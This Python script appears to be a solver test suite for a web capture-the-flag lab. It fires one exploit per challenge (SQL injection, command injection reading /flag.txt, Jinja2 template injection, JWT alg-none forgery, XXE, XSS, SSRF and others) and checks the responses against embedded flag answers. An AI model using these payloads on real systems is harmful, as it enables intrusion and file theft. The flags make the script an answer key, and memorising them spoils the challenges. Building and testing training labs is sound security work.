#!/usr/bin/env python3
"""
Automated Solver Test Suite for Web CTF Challenges
Runs automated exploits against the target web application to verify 100% solver pass rate.
"""
import sys
import base64
import urllib.request
import urllib.parse
import json

TARGET_URL = sys.argv[1] if len(sys.argv) > 1 else "http://localhost:8000"
passed = 0
failed = 0

def log_result(name, success, detail=""):
    global passed, failed
    if success:
        passed += 1
        print(f"[+] SUCCESS: {name} -> PASSED")
    else:
        failed += 1
        print(f"[-] FAILED: {name} -> {detail}")

print(f"[*] Testing 15-Challenge CTF Web Suite against {TARGET_URL}...\n")

# 1. SQLi
try:
    data = urllib.parse.urlencode({"username": "admin' --", "password": "x"}).encode()
    req = urllib.request.Request(f"{TARGET_URL}/sqli/login", data=data, method="POST")
    with urllib.request.urlopen(req) as res:
        body = res.read().decode()
        log_result("SQLi Auth Bypass", "CTF{34sy_sql_1nj3ct10n_byp4ss_2026}" in body)
except Exception as e:
    log_result("SQLi Auth Bypass", False, str(e))

# 2. Comment Leak
try:
    with urllib.request.urlopen(f"{TARGET_URL}/hidden_comment/secret_admin_dashboard_99") as res:
        body = res.read().decode()
        log_result("HTML Comment Leak", "CTF{h7ml_c0mm3n7_l34k_d1sc0v3r3d_2026}" in body)
except Exception as e:
    log_result("HTML Comment Leak", False, str(e))

# 3. Cookie Manipulation
try:
    cookie_val = base64.b64encode(b"role=admin").decode()
    req = urllib.request.Request(f"{TARGET_URL}/cookie_lab/")
    req.add_header("Cookie", f"user_session={cookie_val}")
    with urllib.request.urlopen(req) as res:
        body = res.read().decode()
        log_result("Cookie Manipulation", "CTF{c00k13_m4n1pul4710n_m4s73r_2026}" in body)
except Exception as e:
    log_result("Cookie Manipulation", False, str(e))

# 4. IDOR
try:
    with urllib.request.urlopen(f"{TARGET_URL}/idor/?user_id=100") as res:
        body = res.read().decode()
        log_result("IDOR Profile View", "CTF{1d0r_pr1v1l3g3_3sc4l4710n_2026}" in body)
except Exception as e:
    log_result("IDOR Profile View", False, str(e))

# 5. LFI
try:
    with urllib.request.urlopen(f"{TARGET_URL}/lfi/?page=flag.txt") as res:
        body = res.read().decode()
        log_result("Local File Inclusion", "CTF{lfi_path_tr4v3rs4l_m4st3r_2026}" in body or "CTF{" in body)
except Exception as e:
    log_result("Local File Inclusion", False, str(e))

# 6. RCE Ping
try:
    data = urllib.parse.urlencode({"host": "127.0.0.1; cat /flag.txt"}).encode()
    req = urllib.request.Request(f"{TARGET_URL}/rce_ping/", data=data, method="POST")
    with urllib.request.urlopen(req) as res:
        body = res.read().decode()
        log_result("Command Injection", "CTF{rce_c0mm4nd_1nj3ct10n_m4st3r_2026}" in body or "CTF{" in body)
except Exception as e:
    log_result("Command Injection", False, str(e))

# 7. SSRF
try:
    data = urllib.parse.urlencode({"url": f"{TARGET_URL}/ssrf/internal/admin/secret"}).encode()
    req = urllib.request.Request(f"{TARGET_URL}/ssrf/", data=data, method="POST")
    with urllib.request.urlopen(req) as res:
        body = res.read().decode()
        log_result("SSRF Internal Access", "CTF{ssrf_1n73rn4l_n37w0rk_4cc3ss_2026}" in body)
except Exception as e:
    log_result("SSRF Internal Access", False, str(e))

# 8. JWT Alg None
try:
    h = base64.urlsafe_b64encode(b'{"alg":"none","typ":"JWT"}').decode().rstrip('=')
    p = base64.urlsafe_b64encode(b'{"user":"admin","role":"admin"}').decode().rstrip('=')
    jwt_token = f"{h}.{p}."
    req = urllib.request.Request(f"{TARGET_URL}/jwt_lab/")
    req.add_header("Cookie", f"jwt_auth={jwt_token}")
    with urllib.request.urlopen(req) as res:
        body = res.read().decode()
        log_result("JWT Algorithm None", "CTF{jw7_w34k_s3cr37_3sc4l4710n_2026}" in body)
except Exception as e:
    log_result("JWT Algorithm None", False, str(e))

# 9. SSTI
try:
    payload = "{{ self.__init__.__globals__.__builtins__.open('/flag.txt').read() }}"
    data = urllib.parse.urlencode({"template": payload}).encode()
    req = urllib.request.Request(f"{TARGET_URL}/ssti/preview", data=data, method="POST")
    with urllib.request.urlopen(req) as res:
        body = res.read().decode()
        log_result("Jinja2 SSTI WAF Bypass", "CTF{ssti_j1nj42_w4f_byp4ss_2026}" in body or "CTF{" in body)
except Exception as e:
    log_result("Jinja2 SSTI WAF Bypass", False, str(e))

# 10. Reflected XSS
try:
    with urllib.request.urlopen(f"{TARGET_URL}/xss_reflected/?q=%3Cscript%3Ealert(1)%3C/script%3E") as res:
        body = res.read().decode()
        log_result("Reflected XSS", "CTF{xss_r3fl3c73d_s3cr37_l34k_2026}" in body)
except Exception as e:
    log_result("Reflected XSS", False, str(e))

# 11. Robots Secret
try:
    with urllib.request.urlopen(f"{TARGET_URL}/robots_secret/hidden_staging_backup_2026/") as res:
        body = res.read().decode()
        log_result("Robots.txt Recon", "CTF{r0b07s_7x7_d1sc0v3ry_m4s73r_2026}" in body)
except Exception as e:
    log_result("Robots.txt Recon", False, str(e))

# 12. Weak MD5 Hash
try:
    data = urllib.parse.urlencode({"password": "password123"}).encode()
    req = urllib.request.Request(f"{TARGET_URL}/weak_hash/login", data=data, method="POST")
    with urllib.request.urlopen(req) as res:
        body = res.read().decode()
        log_result("MD5 Hash Cracking", "CTF{password123}" in body or "CTF{" in body)
except Exception as e:
    log_result("MD5 Hash Cracking", False, str(e))

# 13. XXE
try:
    xml_data = '<?xml version="1.0"?><!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///flag.txt"> ]><data>&xxe;</data>'.encode()
    req = urllib.request.Request(f"{TARGET_URL}/xxe_lab/", data=xml_data, method="POST", headers={"Content-Type": "application/xml"})
    with urllib.request.urlopen(req) as res:
        body = res.read().decode()
        log_result("XML External Entity (XXE)", "CTF{xxe_xml_3x73rn4l_3n717y_2026}" in body or "CTF{" in body)
except Exception as e:
    log_result("XML External Entity (XXE)", False, str(e))

# 14. Logic Shop
try:
    data = urllib.parse.urlencode({"item": "flag", "quantity": "-10"}).encode()
    req = urllib.request.Request(f"{TARGET_URL}/logic_shop/", data=data, method="POST")
    with urllib.request.urlopen(req) as res:
        body = res.read().decode()
        log_result("Business Logic Price Tampering", "CTF{l0g1c_fl4w_pr1c3_m4n1pul4710n_2026}" in body)
except Exception as e:
    log_result("Business Logic Price Tampering", False, str(e))

print(f"\n[=] Final Results: {passed}/{passed+failed} CTF Challenges verified successfully!")
